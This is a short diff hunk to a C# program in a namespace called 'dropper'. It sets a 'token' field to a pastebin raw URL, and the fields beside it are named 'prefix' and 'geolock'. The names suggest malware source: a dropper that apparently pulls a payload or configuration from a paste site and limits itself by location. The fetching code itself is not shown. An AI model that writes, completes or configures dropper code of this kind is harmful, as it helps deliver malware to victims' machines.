@@ -8,7 +8,7 @@ namespace dropper
 {
     internal class Program
     {
-        private static string token = "";
+        private static string token = "https://pastebin.com/raw/xs0Q8kzv";
         private static string prefix = "";
         private static string geolock = "";
 
